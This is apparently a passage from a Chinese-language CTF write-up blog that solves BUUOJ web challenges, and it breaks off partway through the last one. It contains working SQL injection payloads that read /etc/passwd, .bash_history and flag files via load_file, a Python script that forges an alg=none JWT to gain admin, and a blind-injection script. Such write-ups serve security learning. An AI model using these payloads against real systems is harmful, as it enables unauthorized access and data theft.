src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201251925312.png" alt="image-20220125192508249"></p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201251946557.png" alt="image-20220125194617479"></p><p>既然可以拼接恶意语句 可以直接使用load_file读取文件</p><p>然后先读取 &#x2F;etc&#x2F;passwd 试试看  <code>1&#39;,content=(select (load_file(&#39;/etc/passwd&#39;))),/*</code></p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201251949325.png" alt="image-20220125194922251"></p><p>发现一个 www 账户 类似与 www-data 对外提供网络服务，然后思路就是看他的 .bash_history看看它的历史操作</p><p><code>1&#39;,content=(select (load_file(&#39;/home/www/.bash_history&#39;))),/*</code></p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201251951238.png" alt="image-20220125195147164"></p><p>发现 DS_Store   <code>1&#39;, content=(select (load_file(&#39;/tmp/html/.DS_Store&#39;))),/*</code></p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201251952697.png" alt="image-20220125195251611"></p><p>没有完全读取出来，这个时候将内容编码重新输出  <code>1&#39;,content=(select hex(load_file(&quot;/tmp/html/.DS_Store&quot;))),/*</code></p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201251954344.png" alt="image-20220125195453250"></p><p><code>1&#39;,content=(select hex(load_file(&quot;/var/www/html/flag_8946e1ff1ee3e40f.php&quot;))),/*</code> 然后读取文件即可 我不知道其他人为什么说读取到假flag了</p><h2 id="HFCTF2020-EasyLogin"><a href="#HFCTF2020-EasyLogin" class="headerlink" title="[HFCTF2020]EasyLogin"></a>[HFCTF2020]EasyLogin</h2><p>先注册账号</p><p>登录之后发现 getflag按钮</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201252045400.png" alt="image-20220125204529297"></p><p>同时发现 app.js 大概说明这题用的js处理逻辑  下面是代码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> *  或许该用 koa-static 来处理静态文件</span><br><span class="hljs-comment"> *  路径该怎么配置？不管了先填个根目录XD</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-keyword">const</span> username = $(<span class="hljs-string">&quot;#username&quot;</span>).val();<br>    <span class="hljs-keyword">const</span> password = $(<span class="hljs-string">&quot;#password&quot;</span>).val();<br>    <span class="hljs-keyword">const</span> token = sessionStorage.getItem(<span class="hljs-string">&quot;token&quot;</span>);<br>    $.post(<span class="hljs-string">&quot;/api/login&quot;</span>, &#123;username, password, <span class="hljs-attr">authorization</span>:token&#125;)<br>        .done(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">data</span>) </span>&#123;<br>            <span class="hljs-keyword">const</span> &#123;status&#125; = data;<br>            <span class="hljs-keyword">if</span>(status) &#123;<br>                <span class="hljs-built_in">document</span>.location = <span class="hljs-string">&quot;/home&quot;</span>;<br>            &#125;<br>        &#125;)<br>        .fail(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">xhr, textStatus, errorThrown</span>) </span>&#123;<br>            alert(xhr.responseJSON.message);<br>        &#125;);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">register</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-keyword">const</span> username = $(<span class="hljs-string">&quot;#username&quot;</span>).val();<br>    <span class="hljs-keyword">const</span> password = $(<span class="hljs-string">&quot;#password&quot;</span>).val();<br>    $.post(<span class="hljs-string">&quot;/api/register&quot;</span>, &#123;username, password&#125;)<br>        .done(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">data</span>) </span>&#123;<br>            <span class="hljs-keyword">const</span> &#123; token &#125; = data;<br>            sessionStorage.setItem(<span class="hljs-string">&#x27;token&#x27;</span>, token);<br>            <span class="hljs-built_in">document</span>.location = <span class="hljs-string">&quot;/login&quot;</span>;<br>        &#125;)<br>        .fail(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">xhr, textStatus, errorThrown</span>) </span>&#123;<br>            alert(xhr.responseJSON.message);<br>        &#125;);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">logout</span>(<span class="hljs-params"></span>) </span>&#123;<br>    $.get(<span class="hljs-string">&#x27;/api/logout&#x27;</span>).done(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">data</span>) </span>&#123;<br>        <span class="hljs-keyword">const</span> &#123;status&#125; = data;<br>        <span class="hljs-keyword">if</span>(status) &#123;<br>            <span class="hljs-built_in">document</span>.location = <span class="hljs-string">&#x27;/login&#x27;</span>;<br>        &#125;<br>    &#125;);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getflag</span>(<span class="hljs-params"></span>) </span>&#123;<br>    $.get(<span class="hljs-string">&#x27;/api/flag&#x27;</span>).done(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">data</span>) </span>&#123;<br>        <span class="hljs-keyword">const</span> &#123;flag&#125; = data;<br>        $(<span class="hljs-string">&quot;#username&quot;</span>).val(flag);<br>    &#125;).fail(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">xhr, textStatus, errorThrown</span>) </span>&#123;<br>        alert(xhr.responseJSON.message);<br>    &#125;);<br>&#125;<br></code></pre></td></tr></table></figure><p>对于 koa框架也就是代码注释中提到的 controllers目录是项目控制器存放目录：接受请求，处理逻辑，访问url&#x2F;controllers&#x2F;api.js发现处理逻辑</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> crypto = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;crypto&#x27;</span>);<br><span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>)<br><span class="hljs-keyword">const</span> jwt = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;jsonwebtoken&#x27;</span>)<br><br><span class="hljs-keyword">const</span> APIError = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;../rest&#x27;</span>).APIError;<br><br><span class="hljs-built_in">module</span>.exports = &#123;<br>    <span class="hljs-string">&#x27;POST /api/register&#x27;</span>: <span class="hljs-keyword">async</span> (ctx, next) =&gt; &#123;<br>        <span class="hljs-keyword">const</span> &#123;username, password&#125; = ctx.request.body;<br><br>        <span class="hljs-keyword">if</span>(!username || username === <span class="hljs-string">&#x27;admin&#x27;</span>)&#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> APIError(<span class="hljs-string">&#x27;register error&#x27;</span>, <span class="hljs-string">&#x27;wrong username&#x27;</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">global</span>.secrets.length &gt; <span class="hljs-number">100000</span>) &#123;<br>            <span class="hljs-built_in">global</span>.secrets = [];<br>        &#125;<br><br>        <span class="hljs-keyword">const</span> secret = crypto.randomBytes(<span class="hljs-number">18</span>).toString(<span class="hljs-string">&#x27;hex&#x27;</span>);<br>        <span class="hljs-keyword">const</span> secretid = <span class="hljs-built_in">global</span>.secrets.length;<br>        <span class="hljs-built_in">global</span>.secrets.push(secret)<br><br>        <span class="hljs-keyword">const</span> token = jwt.sign(&#123;secretid, username, password&#125;, secret, &#123;<span class="hljs-attr">algorithm</span>: <span class="hljs-string">&#x27;HS256&#x27;</span>&#125;);<br><br>        ctx.rest(&#123;<br>            <span class="hljs-attr">token</span>: token<br>        &#125;);<br><br>        <span class="hljs-keyword">await</span> next();<br>    &#125;,<br><br>    <span class="hljs-string">&#x27;POST /api/login&#x27;</span>: <span class="hljs-keyword">async</span> (ctx, next) =&gt; &#123;<br>        <span class="hljs-keyword">const</span> &#123;username, password&#125; = ctx.request.body;<br><br>        <span class="hljs-keyword">if</span>(!username || !password) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> APIError(<span class="hljs-string">&#x27;login error&#x27;</span>, <span class="hljs-string">&#x27;username or password is necessary&#x27;</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">const</span> token = ctx.header.authorization || ctx.request.body.authorization || ctx.request.query.authorization;<br><br>        <span class="hljs-keyword">const</span> sid = <span class="hljs-built_in">JSON</span>.parse(Buffer.from(token.split(<span class="hljs-string">&#x27;.&#x27;</span>)[<span class="hljs-number">1</span>], <span class="hljs-string">&#x27;base64&#x27;</span>).toString()).secretid;<br><br>        <span class="hljs-built_in">console</span>.log(sid)<br><br>        <span class="hljs-keyword">if</span>(sid === <span class="hljs-literal">undefined</span> || sid === <span class="hljs-literal">null</span> || !(sid &lt; <span class="hljs-built_in">global</span>.secrets.length &amp;&amp; sid &gt;= <span class="hljs-number">0</span>)) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> APIError(<span class="hljs-string">&#x27;login error&#x27;</span>, <span class="hljs-string">&#x27;no such secret id&#x27;</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">const</span> secret = <span class="hljs-built_in">global</span>.secrets[sid];<br><br>        <span class="hljs-keyword">const</span> user = jwt.verify(token, secret, &#123;<span class="hljs-attr">algorithm</span>: <span class="hljs-string">&#x27;HS256&#x27;</span>&#125;);<br><br>        <span class="hljs-keyword">const</span> status = username === user.username &amp;&amp; password === user.password;<br><br>        <span class="hljs-keyword">if</span>(status) &#123;<br>            ctx.session.username = username;<br>        &#125;<br><br>        ctx.rest(&#123;<br>            status<br>        &#125;);<br><br>        <span class="hljs-keyword">await</span> next();<br>    &#125;,<br><br>    <span class="hljs-string">&#x27;GET /api/flag&#x27;</span>: <span class="hljs-keyword">async</span> (ctx, next) =&gt; &#123;<br>        <span class="hljs-keyword">if</span>(ctx.session.username !== <span class="hljs-string">&#x27;admin&#x27;</span>)&#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> APIError(<span class="hljs-string">&#x27;permission error&#x27;</span>, <span class="hljs-string">&#x27;permission denied&#x27;</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">const</span> flag = fs.readFileSync(<span class="hljs-string">&#x27;/flag&#x27;</span>).toString();<br>        ctx.rest(&#123;<br>            flag<br>        &#125;);<br><br>        <span class="hljs-keyword">await</span> next();<br>    &#125;,<br><br>    <span class="hljs-string">&#x27;GET /api/logout&#x27;</span>: <span class="hljs-keyword">async</span> (ctx, next) =&gt; &#123;<br>        ctx.session.username = <span class="hljs-literal">null</span>;<br>        ctx.rest(&#123;<br>            <span class="hljs-attr">status</span>: <span class="hljs-literal">true</span><br>        &#125;)<br>        <span class="hljs-keyword">await</span> next();<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><p>前面引用库的部分直接说明了考点 JWT</p><p>就是注册时候不能注册admin 但是获取flag需要admin令牌，其实就是替换根据算法重新生成jwt，然后就是admin身份了</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201252109903.png" alt="image-20220125210942801"></p><p>重新登入用户，登录时抓包选取authorization部分，构建脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> jwt<br>token = jwt.encode(<br>&#123;<br>  <span class="hljs-string">&quot;secretid&quot;</span>: [],<br>  <span class="hljs-string">&quot;username&quot;</span>: <span class="hljs-string">&quot;admin&quot;</span>,<br>  <span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-string">&quot;test&quot;</span>,<br>  <span class="hljs-string">&quot;iat&quot;</span>: <span class="hljs-number">1643113661</span><br>&#125;,<br>algorithm=<span class="hljs-string">&quot;none&quot;</span>,key=<span class="hljs-string">&quot;&quot;</span><br>).encode(encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>).decode(encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br><br><span class="hljs-built_in">print</span>(token)<br><span class="hljs-comment">#eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzZWNyZXRpZCI6W10sInVzZXJuYW1lIjoiYWRtaW4iLCJwYXNzd29yZCI6InRlc3QiLCJpYXQiOjE2NDMxMTM2NjF9.</span><br></code></pre></td></tr></table></figure><p>这里</p><p>然后用上面的 admin test 重新登录，然后替换authorization就行</p><h2 id="GYCTF2020-Ezsqli"><a href="#GYCTF2020-Ezsqli" class="headerlink" title="[GYCTF2020]Ezsqli"></a>[GYCTF2020]Ezsqli</h2><p>自己测试发现可以盲注 但是脚本给卡主了，第一次了解到information_schema的替代</p><p>information_schema &#x3D;&gt;  <code>sys.schema_table_statistics</code> &#x2F; <code>sys.x$schema_flattened_keys</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># https://www.cnblogs.com/h3ng/p/12904606.html  脚本来源</span><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br>url = <span class="hljs-string">&#x27;http://14b858fa-e701-47da-a11a-304ef60eb42d.node3.buuoj.cn/&#x27;</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">str_hex</span>(<span class="hljs-params">s</span>):</span> <span class="hljs-comment">#十六进制转换 fl ==&gt; 0x666c</span><br>    res = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> s:<br>        res += <span class="hljs-built_in">hex</span>(<span class="hljs-built_in">ord</span>(i)).replace(<span class="hljs-string">&#x27;0x&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)<br>    res = <span class="hljs-string">&#x27;0x&#x27;</span> + res<br>    <span class="hljs-keyword">return</span> res<br><br>res = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">200</span>):<br>    <span class="hljs-built_in">print</span>(i)<br>    left = <span class="hljs-number">31</span><br>    right = <span class="hljs-number">127</span><br>    mid = left + ((right - left)&gt;&gt;<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">while</span> left &lt; right:<br>        <span class="hljs-comment">#payload = &#x27;1^(ascii(substr(database(),&#123;&#125;,1))&gt;&#123;&#125;)&#x27;.format(i,mid) #爆库</span><br>        <span class="hljs-comment">#payload = &#x27;1^(ascii(substr((select group_concat(table_name) from sys.x$schema_flattened_keys),&#123;&#125;,1))&gt;&#123;&#125;)&#x27;.format(i,mid) #爆表</span><br>        <span class="hljs-comment">#payload = &#x27;1^(ascii(substr((select group_concat(flag) from f1ag_1s_h3r3_hhhhh),&#123;&#125;,1))&gt;&#123;&#125;)&#x27;.format(i,mid) #猜测f1ag_1s_h3r3_hhhhh中的列名为flag</span><br>        key = (str_hex(res+<span class="hljs-built_in">chr</span>(mid)))<br>        payload = <span class="hljs-string">&quot;1 ^ ( (select 1,&#123;&#125;) &gt; (select * from f1ag_1s_h3r3_hhhhh))&quot;</span>.<span class="hljs-built_in">format</span>(key)<br>        data = &#123;<br>            <span class="hljs-string">&#x27;id&#x27;</span>:payload <br>            &#125;<br>        r = requests.post(url = url,  data = data)<br>        <span class="hljs-keyword">if</span> r.status_code == <span class="hljs-number">429</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;too fast&#x27;</span>)<br>            time.sleep(<span class="hljs-number">2</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;Nu1L&#x27;</span>  <span class="hljs-keyword">in</span> r.text:<br>            left = mid + <span class="hljs-number">1</span><br>        <span class="hljs-keyword">elif</span> <span class="hljs-string">&#x27;Nu1L&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> r.text:<br>            right = mid <br>        mid = left + ((right-left)&gt;&gt;<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">if</span> mid == <span class="hljs-number">31</span> <span class="hljs-keyword">or</span> mid == <span class="hljs-number">127</span>:<br>        <span class="hljs-keyword">break</span><br>    <span class="hljs-comment">#res += chr(mid) #爆表</span><br>    res += <span class="hljs-built_in">chr</span>(mid-<span class="hljs-number">1</span>) <span class="hljs-comment">#爆flag</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">str</span>(mid),res)<br><span class="hljs-comment">#give_grandpa_pa_pa_pa</span><br><span class="hljs-comment">#news,users,f1ag_1s_h3r3_hhhhh,users233333333333333</span><br><span class="hljs-comment">#flag&#123;8ebdb3ac-1d0e-47f3-82d5-ef5b4d20fe70&#125;</span><br></code></pre></td></tr></table></figure><h2 id="b01lers2020-Welcome-to-Earth"><a href="#b01lers2020-Welcome-to-Earth" class="headerlink" title="[b01lers2020]Welcome to Earth"></a>[b01lers2020]Welcome to Earth</h2><p>页面不断刷新</p><p>用curl 获取源码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Welcome to Earth<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>AMBUSH!<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>You&#x27;ve gotta escape!<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;/static/img/f18.png&quot;</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">&quot;alien mothership&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;width:60vw;&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"></span><br><span class="javascript">      <span class="hljs-built_in">document</span>.onkeydown = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">event</span>) </span>&#123;</span><br><span class="javascript">        event = event || <span class="hljs-built_in">window</span>.event;</span><br><span class="javascript">        <span class="hljs-keyword">if</span> (event.keyCode == <span class="hljs-number">27</span>) &#123;</span><br><span class="javascript">          event.preventDefault();</span><br><span class="javascript">          <span class="hljs-built_in">window</span>.location = <span class="hljs-string">&quot;/chase/&quot;</span>;</span><br><span class="javascript">        &#125; <span class="hljs-keyword">else</span> die();</span><br><span class="javascript">      &#125;;</span><br><span class="javascript"></span><br><span class="javascript">      <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">sleep</span>(<span class="hljs-params">ms</span>) </span>&#123;</span><br><span class="javascript">        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Promise</span>(<span class="hljs-function"><span class="hljs-params">resolve</span> =&gt;</span> <span class="hljs-built_in">setTimeout</span>(resolve, ms));</span><br><span class="javascript">      &#125;</span><br><span class="javascript"></span><br><span class="javascript">      <span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">dietimer</span>(<span class="hljs-params"></span>) </span>&#123;</span><br><span class="javascript">        <span class="hljs-keyword">await</span> sleep(<span class="hljs-number">10000</span>);</span><br><span class="javascript">        die();</span><br><span class="javascript">      &#125;</span><br><span class="javascript"></span><br><span class="javascript">      <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">die</span>(<span class="hljs-params"></span>) </span>&#123;</span><br><span class="javascript">        <span class="hljs-built_in">window</span>.location = <span class="hljs-string">&quot;/die/&quot;</span>;</span><br><span class="javascript">      &#125;</span><br><span class="javascript"></span><br><span class="javascript">      dietimer();</span><br><span class="javascript">    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>肯定是希望进到程序15行那个chase里面，因此需要满足 event.keyCode&#x3D;&#x3D;27，但直接访问也是可以得</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Welcome to Earth<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>CHASE!<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><br>      You managed to chase one of the enemy fighters, but there&#x27;s a wall coming<br>      up fast!<br>    <span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">&quot;left()&quot;</span>&gt;</span>Left<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">&quot;right()&quot;</span>&gt;</span>Right<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">img</span></span><br><span class="hljs-tag">      <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;/static/img/Canyon_Chase_16.png&quot;</span></span><br><span class="hljs-tag">      <span class="hljs-attr">alt</span>=<span class="hljs-string">&quot;canyon chase&quot;</span></span><br><span class="hljs-tag">      <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;width:60vw;&quot;</span></span><br><span class="hljs-tag">    /&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"></span><br><span class="javascript">      <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">sleep</span>(<span class="hljs-params">ms</span>) </span>&#123;</span><br><span class="javascript">        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Promise</span>(<span class="hljs-function"><span class="hljs-params">resolve</span> =&gt;</span> <span class="hljs-built_in">setTimeout</span>(resolve, ms));</span><br><span class="javascript">      &#125;</span><br><span class="javascript"></span><br><span class="javascript">      <span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">dietimer</span>(<span class="hljs-params"></span>) </span>&#123;</span><br><span class="javascript">        <span class="hljs-keyword">await</span> 